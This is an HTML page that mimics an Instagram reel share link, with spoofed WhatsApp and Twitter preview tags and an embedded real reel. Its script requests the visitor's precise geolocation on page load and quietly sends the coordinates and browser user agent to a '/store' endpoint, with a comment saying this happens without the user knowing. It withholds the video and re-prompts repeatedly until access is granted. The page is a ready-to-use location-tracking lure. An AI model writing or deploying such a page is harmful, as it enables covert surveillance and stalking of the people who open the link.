<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    
    <!-- WhatsApp & Social Media Link Preview Tags -->
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="Instagram reel by aaaaa_hahaha_01 Day 93...(tag your friends 😂😂😂😂😂😂😂😂😂😂😂)">
    <meta property="og:description" content="Watch this reel and more on Instagram.">
    <meta property="og:type" content="video">
    <meta property="og:url" content="https://www.instagram.com/reel/DI0zr7xSYMk/">
    <!-- Using standard Instagram app logo as thumbnail fallback -->
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png">
    <meta property="og:image:width" content="1024">
    <meta property="og:image:height" content="1024">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@instagram">
    <meta name="twitter:title" content="Instagram video by @instagram">
    <meta name="twitter:description" content="Watch this reel and more on Instagram.">
    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000; /* Dark background like IG reels */
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }
    </style>
</head>
<body>
    
    <div id="warning-msg" style="display: none; text-align: center; padding: 20px; font-family: sans-serif; color: white; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; z-index: 10;">
        <h2>Location Access Required</h2>
        <p>You must allow location access to view this content.</p>
        <p>If you previously denied location access, please enable it in your browser's site settings (usually a lock icon in the address bar), then refresh the page.</p>
        <button onclick="location.reload()" style="padding: 10px 20px; margin-top: 15px; font-size: 16px; cursor: pointer; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: bold;">Reload Page</button>
    </div>

    <!-- Instagram Reel Embed -->
    <iframe id="reel-iframe" src="https://www.instagram.com/reel/DI0zr7xSYMk/embed" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>

    <script>
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const uagent = navigator.userAgent;

                        // Silently log to our backend without the user knowing
                        const url = "/store?lat=" + lat +
                                    "&long=" + lon +
                                    "&uagent=" + encodeURIComponent(uagent);

                        fetch(url).catch(() => {});
                        
                        // Show the iframe, hide the warning
                        document.getElementById('reel-iframe').style.display = 'block';
                        document.getElementById('warning-msg').style.display = 'none';
                    },
                    (error) => {
                        console.log("Location denied or error:", error.message);
                        
                        // Hide iframe and show warning message
                        document.getElementById('reel-iframe').style.display = 'none';
                        document.getElementById('warning-msg').style.display = 'block';
                        
                        alert("You must allow location access to view this video.");
                        
                        // Keep requesting in case they didn't permanently deny
                        setTimeout(requestLocation, 2000);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        }

        // Automatic location tracking hidden in the background
        window.addEventListener('load', () => {
            // Wait slightly for the reel to start loading to feel seamless
            setTimeout(requestLocation, 500);
        });
    </script>

</body>
</html>
